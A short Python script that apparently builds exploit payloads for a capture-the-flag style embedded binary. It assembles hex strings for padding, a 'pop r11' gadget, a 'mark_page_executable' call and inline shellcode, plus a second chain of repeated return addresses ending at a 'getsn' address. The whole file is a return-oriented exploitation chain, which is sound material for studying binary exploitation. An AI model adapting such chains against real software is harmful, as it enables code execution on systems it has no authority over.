def main():
    
    # dummy values 
    payload = '4141' * 8

    # pop r11 := 41
    payload += '9844'
    payload += '4100'

    # mark_page_executable
    payload += 'f644'

    # shellcode addr doubling as dummies
    payload += '0041'* 6

    # shellcode 
    payload += '324000ffb0121000'

    return payload

def test_ret():

    ret = '0c45'
    getsn = '2645'

    payload = ret * ((0x30 // 2) - 1)
    payload += getsn 

    return payload 

# print(main())
# print(test_ret())

if __name__ == '__main__':
    for i in range(5):
        print(f'{i+1}:', test_ret())

    print(main())
